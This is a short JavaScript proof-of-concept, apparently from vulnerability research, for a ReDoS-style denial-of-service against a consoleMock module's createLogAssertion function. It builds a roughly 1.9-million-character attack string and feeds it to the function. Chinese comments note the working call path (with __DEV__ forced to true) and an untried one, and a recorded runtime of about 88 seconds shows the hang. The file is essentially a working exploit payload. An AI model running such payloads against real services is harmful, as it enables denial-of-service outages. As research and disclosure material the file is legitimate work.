"use strict";

var _consoleMock = require("./consoleMock.js");
//Attack String :""+"Check your code at "*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "Check your code at ";
}
str += "\0";

//成功的调用路径：createLogAssertion(将317行__DEV__改为了true)
var result = (0, _consoleMock.createLogAssertion)("a", "b", function () {
  return [[1, 2, 3], ""];
})([str]);
console.log(result);

// real    1m28.018s
// user    1m27.701s
// sys     0m0.030s

//尚未尝试的调用路径：normalizeComponentStack----->assertConsoleLogsCleared